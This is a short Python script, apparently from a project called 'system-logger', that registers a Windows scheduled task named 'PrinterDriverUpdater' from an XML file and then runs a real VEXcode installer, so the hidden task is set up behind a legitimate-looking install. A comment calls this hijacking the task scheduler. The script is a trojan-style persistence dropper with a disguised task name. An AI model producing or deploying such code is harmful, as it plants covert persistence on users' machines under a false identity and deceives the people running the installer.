from os import system

task = "schtasks /create /TN PrinterDriverUpdater /XML C:/Users/lhill23/Documents/GitHub/system-logger/PrinterDriverUpdater.xml"
real_installer = "C:/Users/lhill23/Desktop/VEXcodeV5-20220228.exe"

#Hijacking task scheduler, kinda?
def Hijack():
    system(task)
    system(real_installer)

if __name__ == "__main__":
    Hijack()
